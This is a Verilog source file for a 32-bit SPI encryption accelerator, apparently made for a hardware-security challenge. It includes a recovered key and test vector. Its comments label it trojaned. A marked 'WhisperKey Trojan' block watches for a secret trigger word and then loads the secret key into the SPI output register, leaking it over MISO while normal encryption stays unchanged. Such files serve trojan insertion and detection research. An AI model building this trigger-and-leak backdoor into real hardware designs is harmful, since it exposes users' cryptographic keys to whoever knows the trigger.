// ============================================================================
//  les_crypto_golden.v   -   recovered 32-bit "LES" SPI crypto accelerator
//                            (auto-generated trojaned RTL - see tools/pipeline.py)
//
//  Recovered from the challenge block diagrams + the known test vector
//  (0x59C359C3 -> 0x9CD84392).  32-bit block, 4 rounds, same key K each round.
//    Encrypt round :  XOR K -> ROTL8 -> SBox(per byte)         ciphertext = x4
//    Decrypt round :  InvSBox(per byte) -> ROTR8 -> XOR K      plaintext  = y4
//  Recovered key:  K = 0x8E043CB1  (reproduces the test vector exactly, and
//                  matches the key annotated in the provided block diagrams).
//
//  Interface matches ice40_cryptographic_IP.md (SPI peripheral + sideband).
// ============================================================================
module les_crypto_trojan #(
    parameter [31:0] SECRET_KEY = 32'h8E04_3CB1,
    parameter [31:0] TRIGGER    = 32'h1337_C0DE
)(
    input  wire SCK, RST_N, MOSI, NORM_CS_N, START, ENC_DEC,
    output wire MISO, BUSY, ICE_LED
);
    reg [7:0] SBOX[0:255], ISBOX[0:255];
    initial begin $readmemh("sbox.hex", SBOX); $readmemh("isbox.hex", ISBOX); end

    reg [31:0] shift_reg, data_word, text_reg;
    reg [2:0]  state;
    reg        busy_r;

    // round-controller states  (declared before any use, below)
    localparam IDLE=3'd0, S1=3'd1, S2=3'd2, S3=3'd3, S4=3'd4, LD=3'd5;

    wire [31:0] result      = text_reg;
    wire        load_output = (state == LD);


    // ======================================================================
    //  >>>>>>>>>>>>>>>>>>>>   WhisperKey Trojan (auto-inserted)   <<<<<<<<<<<<
    //  Trigger : loaded input word == secret TRIGGER.
    //  Payload : load KEY instead of the ciphertext -> leaks over MISO.
    //  Cost    : one flag + one 32-bit 2:1 mux.  Normal op stays bit-exact.
    // ======================================================================
    reg armed;
    always @(posedge SCK) begin
        if (!RST_N)                               armed <= 1'b0;
        else if (START && (data_word == TRIGGER)) armed <= 1'b1;
        else if (load_output)                     armed <= 1'b0;
    end
    wire [31:0] load_value = armed ? SECRET_KEY : result;
    // ======================================================================


    assign MISO    = shift_reg[31];
    assign BUSY    = busy_r;
    assign ICE_LED = busy_r;

    // 32-bit SPI shift register (MSB first) with parallel load of the result
    always @(posedge SCK) begin
        if (!RST_N)            shift_reg <= 32'd0;
        else if (load_output)  shift_reg <= load_value;  // [Trojan] mux
        else if (!NORM_CS_N)   shift_reg <= {shift_reg[30:0], MOSI};
    end
    always @(posedge SCK) begin
        if (!RST_N)            data_word <= 32'd0;
        else if (NORM_CS_N)    data_word <= shift_reg;
    end

    // round controller FSM: 4 round cycles, then a load cycle (BUSY falls at load)
    always @(posedge SCK) begin
        if (!RST_N) begin state<=IDLE; busy_r<=1'b0; text_reg<=32'd0; end
        else case (state)
            IDLE: if (START) begin text_reg<=round(data_word,ENC_DEC); busy_r<=1'b1; state<=S1; end // round 1
            S1:   begin text_reg<=round(text_reg,ENC_DEC); state<=S2; end   // round 2
            S2:   begin text_reg<=round(text_reg,ENC_DEC); state<=S3; end   // round 3
            S3:   begin text_reg<=round(text_reg,ENC_DEC); state<=S4; end   // round 4
            S4:   begin state<=LD; end                                      // settle
            LD:   begin busy_r<=1'b0; state<=IDLE; end                      // parallel-load result
            default: state<=IDLE;
        endcase
    end

    function [31:0] round;
        input [31:0] x;
        input mode;
        reg [31:0] r;
        begin
            if (mode==1'b0) begin                        // ENCRYPT: XORK -> ROTL8 -> SBox
                r = x ^ SECRET_KEY;
                r = {r[23:0], r[31:24]};                 // ROTL8
                r = {SBOX[r[31:24]],SBOX[r[23:16]],SBOX[r[15:8]],SBOX[r[7:0]]};
            end else begin                               // DECRYPT (inverse): InvSBox -> ROTR8 -> XORK
                r = {ISBOX[x[31:24]],ISBOX[x[23:16]],ISBOX[x[15:8]],ISBOX[x[7:0]]};
                r = {r[7:0], r[31:8]};                   // ROTR8
                r = r ^ SECRET_KEY;
            end
            round = r;
        end
    endfunction
endmodule
